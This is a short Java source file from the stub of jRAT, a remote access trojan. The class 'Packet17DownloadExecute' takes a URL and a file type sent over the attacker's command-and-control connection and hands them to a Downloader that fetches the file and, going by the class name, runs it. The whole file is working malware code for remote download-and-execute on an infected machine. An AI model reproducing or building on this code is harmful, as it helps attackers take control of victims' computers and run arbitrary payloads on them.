package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.instance.readLine();
		String type = Connection.instance.readLine();
		boolean readFromSocket = Connection.instance.readBoolean();
		
		if (readFromSocket) {
			new Downloader(url, false, type, readFromSocket).run();
		} else {
			new Downloader(url, false, type, readFromSocket).start();
		}
		
		
	}

}